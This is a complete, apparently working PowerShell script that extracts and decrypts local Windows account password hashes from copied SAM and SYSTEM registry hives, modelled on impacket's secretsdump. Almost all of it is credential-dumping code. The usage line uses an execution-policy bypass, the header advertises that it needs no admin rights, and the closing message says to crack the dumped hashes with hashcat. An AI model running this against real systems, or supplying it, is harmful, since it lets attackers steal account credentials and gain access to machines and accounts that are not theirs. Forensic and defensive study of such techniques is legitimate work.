<#
  PSOfflineSecretsDump.ps1
  Pure-PowerShell offline dumper for local SAM hashes from an extracted SYSTEM hive
  and SAM hive (e.g. pulled from a WIM or a VSS copy). No admin, no tooling.

  Offline path equivalent to `secretsdump.py -sam SAM -system SYSTEM LOCAL`:
    1. Parse the raw registry hives (regf) directly.
    2. Bootkey (SysKey) from SYSTEM\...\Lsa\{JD,Skew1,GBG,Data} class strings +
       byte permutation [8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7].
    3. SAM hashed boot key from SAM\Domains\Account\F (rev1=RC4, rev2=AES-128-CBC).
    4. Per user: decrypt LM/NT hash (DES+RC4 old-style, DES+AES new-style).
       Output lines:  user:RID:LM:NT

  Algorithm cross-checked against impacket (fortra/impacket, impacket/examples/secretsdump.py):
    RemoteOperations/LocalOperations.getBootKey, SAMHashes.getHBootKey,
    CryptoCommon.deriveKey + transformKey, SAMHashes.__decryptHash.
  Structures (SAM_KEY_DATA, SAM_KEY_DATA_AES, SAM_HASH, SAM_HASH_AES, DOMAIN_ACCOUNT_F,
  USER_ACCOUNT_V) match impacket's definitions.

  Usage:
    powershell -ep bypass -f PSOfflineSecretsDump.ps1 -System C:\x\SYSTEM -Sam C:\x\SAM
    Add -BootKey <32 hex chars> to skip SYSTEM parsing.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)][string]$System,
    [Parameter(Mandatory=$true)][string]$Sam,
    [string]$BootKey = ""
)

$ErrorActionPreference = 'Stop'

# ---------------------------------------------------------------------------
# small byte helpers (PowerShell unrolls returned arrays, so wrap with ',')
# ---------------------------------------------------------------------------
function Slice([byte[]]$a, [int]$start, [int]$len) {
    if ($len -le 0) { return ,(New-Object byte[] 0) }
    $r = New-Object byte[] $len
    [Array]::Copy($a, $start, $r, 0, $len)
    return ,$r
}

function Cat([byte[][]]$parts) {
    $ms = New-Object System.IO.MemoryStream
    foreach ($p in $parts) { $ms.Write($p, 0, $p.Length) }
    $r = $ms.ToArray()
    $ms.Dispose()
    return ,$r
}

function Hex([byte[]]$a) { return (($a | ForEach-Object { $_.ToString('x2') }) -join '') }

# ---------------------------------------------------------------------------
# crypto primitives
# ---------------------------------------------------------------------------
function Get-MD5([byte[]]$data) {
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $h = $md5.ComputeHash($data)
    return ,$h
}

function Invoke-RC4([byte[]]$key, [byte[]]$data) {
    $S = New-Object byte[] 256
    for ($i = 0; $i -lt 256; $i++) { $S[$i] = [byte]$i }
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256
        $t = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $t
    }
    $out = New-Object byte[] $data.Length
    $i = 0; $j = 0
    for ($k = 0; $k -lt $data.Length; $k++) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $t = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $t
        $out[$k] = $data[$k] -bxor $S[($S[$i] + $S[$j]) % 256]
    }
    return ,$out
}

function Invoke-DesEcbDecrypt([byte[]]$key, [byte[]]$data) {
    $des = [System.Security.Cryptography.DES]::Create()
    $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
    $des.Padding = [System.Security.Cryptography.PaddingMode]::None
    $des.Key = $key
    $d = $des.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)
    return ,$d
}

function Invoke-AesCbcDecrypt([byte[]]$key, [byte[]]$iv, [byte[]]$data) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $key
    $aes.IV = $iv
    if (($data.Length % 16) -ne 0) {
        $pad = 16 - ($data.Length % 16)
        $tmp = New-Object byte[] ($data.Length + $pad)
        [Array]::Copy($data, 0, $tmp, 0, $data.Length)
        $data = $tmp
    }
    $d = $aes.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)
    return ,$d
}

# impacket.crypto.transformKey: expand a 7-byte DES key to 8 bytes.
function ConvertTo-DesKey([byte[]]$k) {
    $o = New-Object byte[] 8
    $o[0] = ($k[0] -shr 1)
    $o[1] = ((($k[0] -band 0x01) -shl 6) -bor ($k[1] -shr 2))
    $o[2] = ((($k[1] -band 0x03) -shl 5) -bor ($k[2] -shr 3))
    $o[3] = ((($k[2] -band 0x07) -shl 4) -bor ($k[3] -shr 4))
    $o[4] = ((($k[3] -band 0x0F) -shl 3) -bor ($k[4] -shr 5))
    $o[5] = ((($k[4] -band 0x1F) -shl 2) -bor ($k[5] -shr 6))
    $o[6] = ((($k[5] -band 0x3F) -shl 1) -bor ($k[6] -shr 7))
    $o[7] = ($k[6] -band 0x7F)
    for ($i = 0; $i -lt 8; $i++) { $o[$i] = [byte](($o[$i] -shl 1) -band 0xFF) }
    return ,$o
}

# impacket CryptoCommon.deriveKey: Key1/Key2 from the little-endian RID integer.
function Get-SamDesKeys([uint32]$rid) {
    $k = [BitConverter]::GetBytes($rid)
    $k1 = [byte[]]@($k[0], $k[1], $k[2], $k[3], $k[0], $k[1], $k[2])
    $k2 = [byte[]]@($k[3], $k[0], $k[1], $k[2], $k[3], $k[0], $k[1])
    return ,@((ConvertTo-DesKey $k1), (ConvertTo-DesKey $k2))
}

# ---------------------------------------------------------------------------
# regf hive reader. Cell offsets are relative to the first hbin (file 0x1000);
# a stored offset points at the 4-byte cell size header, data follows.
# ---------------------------------------------------------------------------
$script:HiveBase = 0x1000

function Get-CellData([byte[]]$hive, [int]$off) {
    $p = $script:HiveBase + $off
    if ($p -lt 0 -or ($p + 4) -gt $hive.Length) { throw "cell offset out of range: $off" }
    $size = [BitConverter]::ToInt32($hive, $p)
    $abs = [Math]::Abs($size)
    $len = $abs - 4
    if ($len -lt 0 -or ($p + 4 + $len) -gt $hive.Length) { throw "cell size out of range at $off" }
    return ,(Slice $hive ($p + 4) $len)
}

function Get-Nk([byte[]]$hive, [int]$off) {
    $c = Get-CellData $hive $off
    $flags = [BitConverter]::ToUInt16($c, 2)
    $nameLen = [BitConverter]::ToUInt16($c, 0x48)
    if (($flags -band 0x20) -ne 0) { $name = [Text.Encoding]::ASCII.GetString($c, 0x4C, $nameLen) }
    else                           { $name = [Text.Encoding]::Unicode.GetString($c, 0x4C, $nameLen) }
    return [pscustomobject]@{
        Off        = $off
        Name       = $name.TrimEnd([char]0)
        SubCount   = [BitConverter]::ToInt32($c, 0x14)
        SubListOff = [BitConverter]::ToInt32($c, 0x1C)
        ValCount   = [BitConverter]::ToInt32($c, 0x24)
        ValListOff = [BitConverter]::ToInt32($c, 0x28)
        ClassOff   = [BitConverter]::ToInt32($c, 0x30)
        ClassLen   = [BitConverter]::ToUInt16($c, 0x4A)
    }
}

function Get-SubKeyOffsets([byte[]]$hive, [int]$listOff) {
    if ($listOff -le 0) { return ,([int[]]@()) }
    $c = Get-CellData $hive $listOff
    $sig = [Text.Encoding]::ASCII.GetString($c, 0, 2)
    $count = [BitConverter]::ToUInt16($c, 2)
    $out = New-Object System.Collections.Generic.List[int]
    if ($sig -eq 'lf' -or $sig -eq 'lh') {
        for ($i = 0; $i -lt $count; $i++) { $out.Add([BitConverter]::ToInt32($c, 4 + $i * 8)) }
    } elseif ($sig -eq 'li') {
        for ($i = 0; $i -lt $count; $i++) { $out.Add([BitConverter]::ToInt32($c, 4 + $i * 4)) }
    } elseif ($sig -eq 'ri') {
        for ($i = 0; $i -lt $count; $i++) {
            foreach ($o in (Get-SubKeyOffsets $hive ([BitConverter]::ToInt32($c, 4 + $i * 4)))) { $out.Add($o) }
        }
    }
    return ,$out.ToArray()
}

function Find-SubKey([byte[]]$hive, [int]$parentNkOff, [string]$name) {
    $parent = Get-Nk $hive $parentNkOff
    foreach ($so in (Get-SubKeyOffsets $hive $parent.SubListOff)) {
        $nk = Get-Nk $hive $so
        if ($nk.Name -ieq $name) { return $nk }
    }
    return $null
}

function Get-Value([byte[]]$hive, [int]$nkOff, [string]$name) {
    $nk = Get-Nk $hive $nkOff
    if ($nk.ValCount -le 0) { return $null }
    $list = Get-CellData $hive $nk.ValListOff
    for ($i = 0; $i -lt $nk.ValCount; $i++) {
        $vkOff = [BitConverter]::ToInt32($list, $i * 4)
        if ($vkOff -le 0) { continue }
        $vk = Get-CellData $hive $vkOff
        $flags = [BitConverter]::ToUInt16($vk, 0x10)
        $nameLen = [BitConverter]::ToUInt16($vk, 2)
        if ($nameLen -gt 0) {
            if (($flags -band 0x0001) -ne 0) { $vn = [Text.Encoding]::ASCII.GetString($vk, 0x14, $nameLen) }
            else                             { $vn = [Text.Encoding]::Unicode.GetString($vk, 0x14, $nameLen) }
            $vn = $vn.TrimEnd([char]0)
        } else { $vn = '' }
        if ($vn -ine $name) { continue }

        $dataSize = [BitConverter]::ToUInt32($vk, 4)
        $dataOff  = [BitConverter]::ToInt32($vk, 8)
        if (($dataSize -band 0x80000000) -ne 0) {
            $len = [int]($dataSize -band 0x7FFFFFFF)
            if ($len -eq 0x3FFF) {
                $hdr = Get-CellData $hive $dataOff
                $total = [BitConverter]::ToInt32($hdr, 0)
                $res = New-Object byte[] $total
                $idx = 0; $segIndex = 0
                while ($idx -lt $total) {
                    $so = [BitConverter]::ToInt32($hdr, 8 + $segIndex * 4)
                    $seg = Get-CellData $hive $so
                    $n = [Math]::Min(0x3FD8, $total - $idx)
                    [Array]::Copy($seg, 0, $res, $idx, [Math]::Min($n, $seg.Length))
                    $idx += $n; $segIndex++
                }
                return ,$res
            } else {
                return ,(Slice $hive ($script:HiveBase + $dataOff + 4) $len)
            }
        } else {
            $len = [int]$dataSize
            $res = New-Object byte[] $len
            $raw = [BitConverter]::GetBytes($dataOff)
            [Array]::Copy($raw, 0, $res, 0, [Math]::Min($len, 4))
            return ,$res
        }
    }
    return $null
}

function Get-KeyClass([byte[]]$hive, [int]$nkOff) {
    $nk = Get-Nk $hive $nkOff
    if ($nk.ClassLen -le 0 -or $nk.ClassOff -le 0) { return '' }
    $c = Get-CellData $hive $nk.ClassOff
    $s = [Text.Encoding]::Unicode.GetString($c, 0, [Math]::Min($nk.ClassLen, $c.Length))
    return $s.TrimEnd([char]0)
}

# ---------------------------------------------------------------------------
# bootkey (SysKey) from the SYSTEM hive
# ---------------------------------------------------------------------------
$script:BootKeyPerm = @(8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7)

function Get-BootKey([byte[]]$system) {
    $rootOff = [BitConverter]::ToInt32($system, 0x24)
    $root = Get-Nk $system $rootOff
    $cs = $null
    foreach ($csName in @('ControlSet001', 'CurrentControlSet', 'ControlSet002')) {
        $cs = Find-SubKey $system $root.Off $csName
        if ($cs -and (Find-SubKey $system $cs.Off 'Control')) { break }
        $cs = $null
    }
    if (-not $cs) { throw 'no usable control set in SYSTEM hive' }
    $control = Find-SubKey $system $cs.Off 'Control'
    $lsa = Find-SubKey $system $control.Off 'Lsa'
    if (-not $lsa) { throw 'Lsa key not found' }

    $hex = ''
    foreach ($k in @('JD', 'Skew1', 'GBG', 'Data')) {
        $sub = Find-SubKey $system $lsa.Off $k
        if (-not $sub) { throw "Lsa subkey $k not found" }
        $hex += (Get-KeyClass $system $sub.Off)
    }
    if ($hex.Length -ne 32) { throw "bootkey class concat is $($hex.Length) hex chars (expected 32)" }

    $raw = New-Object byte[] 16
    for ($i = 0; $i -lt 16; $i++) { $raw[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) }
    $boot = New-Object byte[] 16
    for ($i = 0; $i -lt 16; $i++) { $boot[$i] = $raw[$script:BootKeyPerm[$i]] }
    return ,$boot
}

# ---------------------------------------------------------------------------
# SAM hashed boot key + per-user hash decryption
# ---------------------------------------------------------------------------
$script:QWERTY = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
$script:DIGITS = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")

function Test-Equal([byte[]]$a, [byte[]]$b) {
    if ($a.Length -ne $b.Length) { return $false }
    for ($i = 0; $i -lt $a.Length; $i++) { if ($a[$i] -ne $b[$i]) { return $false } }
    return $true
}

function Get-HashedBootKey([byte[]]$sam, [byte[]]$bootKey) {
    $rootOff = [BitConverter]::ToInt32($sam, 0x24)
    $root = Get-Nk $sam $rootOff
    $domains = Find-SubKey $sam $root.Off 'Domains'
    if (-not $domains) { throw 'SAM DOMAINS key not found' }
    $account = Find-SubKey $sam $domains.Off 'Account'
    if (-not $account) { throw 'SAM Account key not found' }

    $F = Get-Value $sam $account.Off 'F'
    if (-not $F) { throw 'SAM Account F value missing' }
    $key0 = Slice $F 0x68 ($F.Length - 0x68)

    if ($key0[0] -eq 0x01) {
        # SAM_KEY_DATA: Rev4 Len4 Salt16 Key16 CheckSum16
        $salt     = Slice $key0 8 16
        $key      = Slice $key0 0x18 16
        $checkSum = Slice $key0 0x28 16
        $rc4Key = Get-MD5 (Cat @($salt, $script:QWERTY, $bootKey, $script:DIGITS))
        $hbk = Invoke-RC4 $rc4Key (Cat @($key, $checkSum))
        $verify = Get-MD5 (Cat @((Slice $hbk 0 16), $script:DIGITS, (Slice $hbk 0 16), $script:QWERTY))
        if (-not (Test-Equal $verify (Slice $hbk 16 16))) {
            throw 'hashed boot key checksum failed (SysKey startup password in use?)'
        }
        return ,(Slice $hbk 0 16)
    } elseif ($key0[0] -eq 0x02) {
        # SAM_KEY_DATA_AES: Rev4 Len4 CheckSumLen4 DataLen4 Salt16 Data
        $dataLen = [BitConverter]::ToInt32($key0, 0xC)
        $salt    = Slice $key0 0x10 16
        $data    = Slice $key0 0x20 $dataLen
        return ,(Invoke-AesCbcDecrypt $bootKey $salt $data)
    } else {
        throw ("unsupported SAM F key revision 0x{0:x2}" -f $key0[0])
    }
}

function Unwrap-Hash([byte[]]$hbk, [uint32]$rid, [byte[]]$crypted, [string]$constant, [bool]$newStyle) {
    $keys = Get-SamDesKeys $rid
    $key1 = $keys[0]; $key2 = $keys[1]

    if ($newStyle) {
        # SAM_HASH_AES: PekID2 Rev2 DataOffset4 Salt16 Hash
        $salt = Slice $crypted 8 16
        $hash = Slice $crypted 0x18 ($crypted.Length - 0x18)
        $inter = Invoke-AesCbcDecrypt (Slice $hbk 0 16) $salt $hash
        $key = Slice $inter 0 16
    } else {
        # SAM_HASH: PekID2 Rev2 Hash16
        $hash = Slice $crypted 4 16
        $cbytes = [Text.Encoding]::ASCII.GetBytes($constant + "`0")
        $rc4Key = Get-MD5 (Cat @((Slice $hbk 0 16), ([BitConverter]::GetBytes($rid)), $cbytes))
        $key = Invoke-RC4 $rc4Key $hash
    }

    $d1 = Invoke-DesEcbDecrypt $key1 (Slice $key 0 8)
    $d2 = Invoke-DesEcbDecrypt $key2 (Slice $key 8 8)
    return ,(Cat @($d1, $d2))
}

function Get-SamHashes([byte[]]$sam, [byte[]]$bootKey) {
    $hbk = Get-HashedBootKey $sam $bootKey
    $rootOff = [BitConverter]::ToInt32($sam, 0x24)
    $root = Get-Nk $sam $rootOff
    $domains = Find-SubKey $sam $root.Off 'Domains'
    $account = Find-SubKey $sam $domains.Off 'Account'
    $users = Find-SubKey $sam $account.Off 'Users'
    if (-not $users) { throw 'SAM Users key not found' }

    $results = New-Object System.Collections.Generic.List[string]
    foreach ($ridOff in (Get-SubKeyOffsets $sam $users.SubListOff)) {
        $u = Get-Nk $sam $ridOff
        if ($u.Name -ieq 'Names') { continue }
        if ($u.Name -notmatch '^[0-9a-fA-F]+$') { continue }
        $rid = [Convert]::ToUInt32($u.Name, 16)

        $V = Get-Value $sam $u.Off 'V'
        if (-not $V) { continue }

        $nameOffset = [BitConverter]::ToInt32($V, 0x0C)
        $nameLength = [BitConverter]::ToInt32($V, 0x10)
        $lmOff = [BitConverter]::ToInt32($V, 0x9C)
        $lmLen = [BitConverter]::ToInt32($V, 0xA0)
        $ntOff = [BitConverter]::ToInt32($V, 0xA8)
        $ntLen = [BitConverter]::ToInt32($V, 0xAC)
        $dataStart = 0xCC

        $uname = [Text.Encoding]::Unicode.GetString($V, $dataStart + $nameOffset, $nameLength)

        if ($ntLen -le 0) { continue }
        $ntBlob = Slice $V ($dataStart + $ntOff) $ntLen

        $newStyle = -not ($ntBlob[2] -eq 0x01)
        $ntHash = Unwrap-Hash $hbk $rid $ntBlob 'NTPASSWORD' $newStyle

        $lmHex = 'aad3b435b51404eeaad3b435b51404ee'
        if ($lmLen -eq 20 -or $lmLen -eq 24) {
            $lmBlob = Slice $V ($dataStart + $lmOff) $lmLen
            $lmHash = Unwrap-Hash $hbk $rid $lmBlob 'LMPASSWORD' $newStyle
            $lmHex = Hex $lmHash
        }
        $ntHex = Hex $ntHash

        $results.Add(("{0}:{1}:{2}:{3}:::" -f $uname, $rid, $lmHex, $ntHex))
    }
    return ,$results.ToArray()
}

# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
if (-not $env:PSOSD_NO_MAIN) {

Write-Host "[*] Reading SYSTEM hive: $System"
$sysBytes = [IO.File]::ReadAllBytes($System)
Write-Host "[*] Reading SAM hive: $Sam"
$samBytes = [IO.File]::ReadAllBytes($Sam)

if ($BootKey -ne "") {
    if ($BootKey.Length -ne 32) { throw 'BootKey must be 32 hex chars' }
    $boot = New-Object byte[] 16
    for ($i = 0; $i -lt 16; $i++) { $boot[$i] = [Convert]::ToByte($BootKey.Substring($i * 2, 2), 16) }
    Write-Host "[*] Using supplied bootkey"
} else {
    Write-Host "[*] Deriving bootkey from SYSTEM hive"
    $boot = Get-BootKey $sysBytes
}
Write-Host ("[*] Bootkey: 0x{0}" -f (Hex $boot))

Write-Host "[*] Dumping local SAM hashes (user:rid:lmhash:nthash)"
foreach ($line in (Get-SamHashes $samBytes $boot)) { Write-Output $line }
Write-Host "[*] Done. Crack NT hashes offline (hashcat -m 1000)."

} # end main guard
